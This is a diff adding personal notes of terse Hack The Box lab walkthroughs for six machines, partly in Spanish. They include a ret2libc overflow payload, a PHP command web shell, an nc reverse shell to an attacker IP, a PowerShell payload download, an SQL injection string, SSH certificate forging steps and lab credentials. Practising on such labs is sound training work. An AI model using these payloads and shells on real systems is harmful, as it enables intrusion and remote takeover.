@@ -1,0 +1,109 @@
+
+HTB FROLIC
+ 
+1) As always enum
+2) visit 2 sites and dirbuster in diferent ports 9999 and 1880 open 22 open 139 and 445
+3) found 2 sites on 9999 site : /backup and /admin login to admin are in source code and js script
+4) admin login shows a weird code
+5) backup page show user and pass txt admin:imnothuman
+6)the weird code its formated in Ook go to decode.fr and decode it
+7)the decoded Ook strings points to a dir /asdiSIAJJ0QWE9JAS/
+8)dir contains encoded zip to decode and download go to freeformater
+9)crack zip file with fcrackzip -v -u -D -p /usr/share/dic/words
+10) password
+11)found index.php with another coded
+12) decoded first hex to ascii to base64 to brainfuck and get the password "idkwhatispass"
+13)found dir with gobuster and medium dic for playsms
+14)get a meterpreter session with
+exploit/multi/http/playsms_uploadcsv_exec user and pass you got
+15)get the user flag
+16)ldd rop to know the lib adrres its using
+17)export PATH=/usr/lib/gcc/i686-linux-gnu/5:/sbin:/bin:/usr/sbin:/usr/bin
+18)start searching for system, execve, exit and /bin/sh adresss
+19)upload the script libc-search.c
+20)compile it like this gcc libc-search.c -o libc-search -lc -ldl and run
+21)search -s system then -s exit then -s execve
+22)search -p /bin/sh -b "libcstring"  --------> 0xb7e190003
+23)begin to make our exploit with perl
+ 
+The exit address is: 0xb7e479d0
+The system address is: 0xb7e53da0
+The execve address is: 0xb7ec97e0
+The /bin/sh address is: 0xb7f74a0b
+cat /proc/$$/maps | grep stack bffdf000-c0000000 rw-p 00000000 00:00 0 [stack]
+ 
+ 
+exit() -> "\xd0\x79\xe4\xb7"; system() -> "\xa0\x3d\xe5\xb7"; execve() -> "\xe0\x97\xec\xb7"
+stack is \xe0\xf0\xfd\xbf
+so buffer at 48, dummy at 4, execve pointer, exit pointer, /bin/sh pointer, and stack pointer which acts as system
+ 
+so exploit its
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>    
+python -c 'print "A"*48+"B"*4+"\xe0\x97\xec\xb7"+"\xc8\x97\xec\xb7"+"\x0b\x4a\xf7\xb7"+"\xe0\xf0\xfd\xbf"+"\xe0\xf0\xfd\xbf"'
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+24)run ./rop $(exploit)
+25)cat root flag
+ 
+HTB CARRIER
+1)Do a full port scan TCP and UDP
+2)Found login page whic contains some codes about errors saying password its the chassis number
+3)got port 161 running snmp
+4)use snmpwalk -v 1 -c public 10.10.10.105
+5) got the number SN#NET_45JDX23
+6)Login with user admin and the pass
+ 
+HTB SECNOTES
+1)Enumeration with nmap discovering open ports full tcp scan all ports
+2)enter web page and create a user with a sqli query ' OR '1'='1
+3)search in the notes for user and pass  :  92g!mA8BGjOirkL%OG*&
+4)login with smbclient and upload a shell like this:
+       
+<?php
+if(isset($_REQUEST['cmd'])){
+        echo "<pre>";
+        $cmd = ($_REQUEST['cmd']);
+        system($cmd);
+        echo "</pre>";
+        die;
+}
+?>
+ 
+5)Using nc.exe establish a reverse connection to attacker machine wiht nc -nv 10.10.xx.xx 4444 -e cmd.exe
+6)notice the weird distro folder containig ubuntu so we must find bash.exe running dir bash.exe /s /p
+7)run bash.exe and search for the past and login with smbclient with credentials to read the root.txt flag
+ 
+HTB YPUFFY
+1) Enum ldap and find the hashes for alice user
+2) use the hashes with smb login
+3) get the ssh key and login trough ssh
+4) read the doas.conf httpd.conf and sshd_config
+5) try to enumerate users and principals with curl with command /usr/local/bin/curl -i 'http://127.0.0.1/sshauth?type=principals&username=root'
+6)go to /tmp and generate a ssh id_rsa key for alice
+7)generate certificate for principal with id_rsa private key generated with command
+doas -u userca /usr/bin/ssh-keygen -s /home/userca/ca -I alice1978 -n 3m3rgencyB4ckd00r id_rsa
+8)login with ssh to root@localhost with private key
+9)flag
+ 
+HTB Bounty
+1)Enumerate and find .aspx files
+2)find upload webapp and use format web.config with correct payload
+3)upload payload and use your RCE
+4)powershell download files thorugh webshell
+ - powershell $WebClient = New-Object System.Net.WebClient; $WebClient.DownloadFile('http://10.10.15.x/payload.exe','C:\netpub\wwwroot\UploadedFiles\payload.exe')
+ - powershell \path\to\payload
+5)run payload with powershell
+6)multi handler meterpreter
+7)migrate to x64 shell
+8)run post explotation module and exploit(root)
+ 
+ 
+TB WALDO
+ 
+1) Usando burp suite se encuentra la ruta en la cual se puede hacer el directory transversal desde este se encuentra la vulnerabilidad y notamos que existe un filtro el cual se puede evadir usando ./ para ir al primer directorio y luego ....//(para saltar el filtro).
+2) Al encontrar la llave ssh del usuario nobody esta se debe formatear y se deben borrar todos los caracteres "\n"asi como "\"y se formatea en https://www.samltool.com/format_privatekey.php.
+ 
+3) logearse por ssh con el usuario nobody
+ 
+4)login again with the same ssh key from remote machine as monitor to localhost with args -t bash -norc" without quotes to break the default bash login
+ 
+5)run "/usr/bin/tac /root/root.txt
